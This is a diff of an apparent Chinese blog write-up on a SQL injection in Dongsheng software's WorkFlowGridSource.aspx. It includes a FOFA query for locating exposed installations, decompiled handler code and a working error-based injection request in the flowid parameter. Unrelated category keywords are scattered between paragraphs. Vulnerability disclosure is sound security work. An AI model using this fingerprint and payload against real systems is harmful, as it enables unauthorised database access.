@@ -15,22 +15,18 @@ asset_dir: embedded-base64
 # fofa语法
 
 > body="FeeCodes/CompanysAdapter.aspx" || body="dhtmlxcombo\_whp.js" || body="dongshengsoft" || body="theme/dhtmlxcombo.css"
->
-> 编程
 
 # 漏洞分析
 
 深入探索
 
-开发工具
+计算机科学
 
-代理与过滤
+书籍
 
-Linux
+内容管理系统
 
 根据 `WorkFlowGridSource.aspx` 的代码引用 `DSWeb.WorkFlow.WorkFlowGridSource` ，在dll中找到它的逻辑实现
-
-网络安全
 
 ```
 protected void Page_Load(object sender, EventArgs e)
@@ -48,7 +44,7 @@ protected void Page_Load(object sender, EventArgs e)
 
 主要就是根据`handle`参数的值来进行处理不同的分支逻辑
 
-数据管理
+编程
 
 当**`handle=steplist`**且`flowid`必须存在时，进入`GetWorkFlowSteps`方法
 
@@ -65,11 +61,11 @@ protected void Page_Load(object sender, EventArgs e)
 
 深入探索
 
-vpn
+数据管理
 
-VPN
+计算机服务器
 
-商务软件和生产力软件
+网络
 
 ```
 GET /WorkFlow/WorkFlowGridSource.aspx?handle=steplist&flowid='-1/user-- HTTP/1.1
@@ -80,4 +76,4 @@ Host: dongsheng.mrxn.net
 
 通过[报错注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5 "标签：报错注入")在响应里回显数据库版本信息。
 
-计算机服务器
+数据管理
